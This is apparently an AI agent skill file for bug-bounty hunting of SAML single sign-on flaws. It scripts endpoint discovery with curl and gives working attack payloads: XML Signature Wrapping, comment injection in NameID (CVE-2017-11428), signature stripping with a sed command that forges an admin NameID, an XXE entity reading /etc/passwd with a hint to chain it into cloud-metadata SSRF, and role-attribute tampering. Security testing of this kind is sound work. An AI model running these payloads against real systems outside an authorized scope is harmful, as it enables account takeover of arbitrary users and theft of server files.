---
name: k1nzr3c0n-hunt-saml
description: "Hunt SAML/SSO attacks. Patterns: XSW (XML Signature Wrapping — inject evil assertion while keeping Signature valid), comment injection in NameID (CVE-2017-11428), signature stripping, XXE in SAML assertion, NameID manipulation. Tools: SAMLRaider Burp extension. Detection: /saml/acs, /sso/saml, /auth/saml/callback. Validate: ATO via altered NameID or admin role injection."
tags: [saml, sso, ato, xsw, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — SAML/SSO Attacks

> **SSO bugs pay High-Critical.** XML parsers are notoriously inconsistent.
> **Tool**: SAMLRaider Burp extension (BApp Store) — automated XSW1-XSW8.

---

## Phase 0 — Detect SAML Endpoints

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_saml_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

echo "=== SAML Endpoint Discovery ==="
grep -iE '(saml|sso|idp|sp|shibboleth|adfs|acs|assertion)' \
  /tmp/recon_*/endpoints/all_urls.txt 2>/dev/null | sort -u | head -20 | sed 's/^/  /'

echo ""
echo "Common SAML paths:"
for EP in /saml/acs /saml/login /sso/saml /sso/saml2 /auth/saml /auth/saml/callback \
  /Shibboleth.sso /saml2/acs /sso /idp/login /sp/login /login/sso; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}${EP}")
  [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && echo "  [$STATUS] ${EP}"
done

echo ""
echo "SAML metadata (may expose IdP/SP cert, EntityID):"
for META in /saml/metadata /saml2/metadata /sso/saml/metadata /sp/metadata /FederationMetadata/2007-06/FederationMetadata.xml; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}${META}")
  [ "$STATUS" = "200" ] && echo "  [HIT] ${META}"
done
```

## Phase 1 — Capture SAMLResponse

```bash
echo "=== Capture SAMLResponse ==="
echo "1. Start Burp intercept"
echo "2. Log in via SSO on target"
echo "3. Capture POST to /saml/acs containing SAMLResponse=BASE64"
echo ""
echo "Decode captured SAMLResponse:"
echo 'SAML_BASE64=$(echo "PASTE_BASE64_HERE")'
echo 'echo "$SAML_BASE64" | base64 -d | xmllint --format - > /tmp/saml.xml 2>/dev/null'
echo 'cat /tmp/saml.xml'
echo ""
echo "Key elements to note:"
echo "  <NameID>   — your email/user identity"
echo "  <Issuer>   — IdP EntityID"
echo "  <Audience> — SP EntityID (if missing = vulnerability)"
echo "  <Signature> — covers which element IDs?"
echo "  NotBefore/NotOnOrAfter — validity window"
```

## Phase 2 — Attack 1: XML Signature Wrapping (XSW)

```bash
echo "=== Attack 1: XML Signature Wrapping (XSW) ==="
cat << 'EXPLAIN'
BEFORE (valid — your assertion):
  <saml:Response>
    <saml:Assertion ID="legit">
      <NameID>user@company.com</NameID>
      <ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>
    </saml:Assertion>
  </saml:Response>

AFTER (XSW — inject evil assertion, signature still validates):
  <saml:Response>
    <saml:Assertion ID="evil">
      <NameID>admin@company.com</NameID>   ← attacker-controlled
    </saml:Assertion>
    <saml:Assertion ID="legit">
      <NameID>user@company.com</NameID>
      <ds:Signature><!-- Valid --></ds:Signature>
    </saml:Assertion>
  </saml:Response>

WHY IT WORKS: Signature covers ID=legit (still valid).
App processes FIRST assertion found = the evil one.
EXPLAIN
echo ""
echo "Use SAMLRaider Burp extension → intercept SAMLResponse → SAML Raider tab → XSW attacks"
echo "Try all XSW1-XSW8 variants automatically"
```

## Phase 3 — Attack 2: Comment Injection in NameID

```bash
echo "=== Attack 2: Comment Injection (CVE-2017-11428) ==="
cat << 'XML'
<!-- Requires: attacker controls account admin@company.com.evil.com -->
<NameID>admin@company.com<!---->.evil.com</NameID>

How it works:
  - Signer's C14N strips comments → signs "admin@company.com.evil.com"
  - SP's parser reads text node UP TO comment → sees "admin@company.com"
  - Discrepancy = attacker logs in as admin@company.com

Affects: Ruby-SAML / OneLogin before 2017 patch
XML
```

## Phase 4 — Attack 3: Signature Stripping

```bash
echo "=== Attack 3: Signature Stripping ==="
echo "1. Decode SAMLResponse:"
echo "   echo BASE64 | base64 -d | xmllint --format - > /tmp/saml.xml"
echo ""
echo "2. Edit /tmp/saml.xml — DELETE entire <ds:Signature> element"
echo ""
echo "3. Change NameID to target account:"
sed -i 's|<saml:NameID[^>]*>[^<]*</saml:NameID>|<saml:NameID>admin@company.com</saml:NameID>|' /tmp/saml.xml 2>/dev/null || \
  echo "   sed -i change NameID manually"
echo ""
echo "4. Re-encode:"
echo "   base64 -w0 /tmp/saml.xml"
echo "   URL-encode result before sending as SAMLResponse= parameter"
echo ""
echo "5. POST to /saml/acs"
echo "   If server grants session → wantAssertionsSigned=false → CRITICAL"
```

## Phase 5 — Attack 4: XXE in SAML Assertion

```bash
echo "=== Attack 4: XXE in SAML Assertion ==="
cat << 'XML'
<!-- Inject XXE into SAMLResponse before Signature -->
<?xml version="1.0"?>
<!DOCTYPE saml:Assertion [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml:Response>
  <saml:Assertion>
    <saml:NameID>&xxe;</saml:NameID>
  </saml:Assertion>
</saml:Response>
XML
echo ""
echo "If /etc/passwd content appears in error or response → XXE in SAML parser"
echo "Chain: XXE → SSRF to cloud metadata if external entities allowed"
```

## Phase 6 — Attack 5: NameID Manipulation

```bash
echo "=== Attack 5: NameID Manipulation ==="
echo "Try these NameID values (after capturing and re-encoding SAMLResponse):"
echo "  admin@company.com"
echo "  administrator@company.com"
echo "  support@${TARGET}"
echo "  root@${TARGET}"
echo "  Any email from disclosed reports for this program"
echo '  ${7*7}  (SSTI if NameID gets rendered in a template)'
echo ""
echo "Also test AttributeStatement manipulation:"
echo "  Change role attribute: user → admin, employee → superuser"
echo "  Add is_admin=true attribute"
```

## Gate 0

```bash
echo "=== SAML Gate 0 ==="
echo "  □ XSW: session issued with evil NameID (admin@company.com)"
echo "  □ Sig strip: session issued without valid signature"
echo "  □ Comment injection: logged in as admin@ (not evil.com)"
echo "  □ XXE: /etc/passwd content in error response"
echo "  □ Replay: same Assertion accepted twice in validity window"
echo "  □ No AudienceRestriction: assertion for IdP-A accepted by SP-B"
echo ""
echo "  SEVERITY: XSW/sig-strip → CRITICAL (ATO any user)"
echo "  Comment injection → HIGH (ATO admin)"
echo "  XXE in SAML → HIGH (file read / SSRF)"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
SAML XSW (XSW1) on [/saml/acs]: injected evil Assertion with NameID=admin@target.com is processed before the signed legitimate Assertion — admin account takeover confirmed
SAML signature stripping on [/sso/saml/callback]: removing <ds:Signature> element entirely accepted by SP (wantAssertionsSigned=false) → any NameID value grants valid session
XXE in SAML assertion parser on [/saml/acs]: <!ENTITY xxe SYSTEM "file:///etc/passwd"> in assertion returns /etc/passwd content in error response
```
